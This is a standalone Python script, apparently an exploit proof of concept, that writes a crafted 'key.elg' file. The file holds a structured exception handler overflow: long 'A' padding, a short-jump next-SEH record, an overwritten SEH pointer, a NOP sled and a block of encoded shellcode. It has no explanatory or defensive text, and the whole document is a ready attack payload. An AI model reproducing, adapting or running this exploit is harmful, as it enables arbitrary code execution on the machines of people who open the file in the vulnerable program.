#!/usr/bin/python

file = open('key.elg' , 'w');

buffer = "A"*4424
nseh = "\xeb\x18\x90\x90"
seh = "\xc0\x28\x40\x00"
nops = "\x90"*30
shellcode = ("\xda\xde\xbe\xa6\x5a\x80\xaa\xd9\x74\x24\xf4\x58\x33\xc9\xb1"
"\x52\x31\x70\x17\x03\x70\x17\x83\x66\x5e\x62\x5f\x9a\xb7\xe0"
"\xa0\x62\x48\x85\x29\x87\x79\x85\x4e\xcc\x2a\x35\x04\x80\xc6"
"\xbe\x48\x30\x5c\xb2\x44\x37\xd5\x79\xb3\x76\xe6\xd2\x87\x19"
"\x64\x29\xd4\xf9\x55\xe2\x29\xf8\x92\x1f\xc3\xa8\x4b\x6b\x76"
"\x5c\xff\x21\x4b\xd7\xb3\xa4\xcb\x04\x03\xc6\xfa\x9b\x1f\x91"
"\xdc\x1a\xf3\xa9\x54\x04\x10\x97\x2f\xbf\xe2\x63\xae\x69\x3b"
"\x8b\x1d\x54\xf3\x7e\x5f\x91\x34\x61\x2a\xeb\x46\x1c\x2d\x28"
"\x34\xfa\xb8\xaa\x9e\x89\x1b\x16\x1e\x5d\xfd\xdd\x2c\x2a\x89"
"\xb9\x30\xad\x5e\xb2\x4d\x26\x61\x14\xc4\x7c\x46\xb0\x8c\x27"
"\xe7\xe1\x68\x89\x18\xf1\xd2\x76\xbd\x7a\xfe\x63\xcc\x21\x97"
"\x40\xfd\xd9\x67\xcf\x76\xaa\x55\x50\x2d\x24\xd6\x19\xeb\xb3"
"\x19\x30\x4b\x2b\xe4\xbb\xac\x62\x23\xef\xfc\x1c\x82\x90\x96"
"\xdc\x2b\x45\x38\x8c\x83\x36\xf9\x7c\x64\xe7\x91\x96\x6b\xd8"
"\x82\x99\xa1\x71\x28\x60\x22\xd2\xbd\x23\x32\x42\xbc\xb3\x23"
"\xcf\x49\x55\x29\xff\x1f\xce\xc6\x66\x3a\x84\x77\x66\x90\xe1"
"\xb8\xec\x17\x16\x76\x05\x5d\x04\xef\xe5\x28\x76\xa6\xfa\x86"
"\x1e\x24\x68\x4d\xde\x23\x91\xda\x89\x64\x67\x13\x5f\x99\xde"
"\x8d\x7d\x60\x86\xf6\xc5\xbf\x7b\xf8\xc4\x32\xc7\xde\xd6\x8a"
"\xc8\x5a\x82\x42\x9f\x34\x7c\x25\x49\xf7\xd6\xff\x26\x51\xbe"
"\x86\x04\x62\xb8\x86\x40\x14\x24\x36\x3d\x61\x5b\xf7\xa9\x65"
"\x24\xe5\x49\x89\xff\xad\x7a\xc0\x5d\x87\x12\x8d\x34\x95\x7e"
"\x2e\xe3\xda\x86\xad\x01\xa3\x7c\xad\x60\xa6\x39\x69\x99\xda"
"\x52\x1c\x9d\x49\x52\x35")
ds = "D" * (5000-len(buffer+nseh+seh+nops+shellcode))

sploit = buffer + nseh + seh + nops + shellcode + ds

file.write(sploit)
file.close()
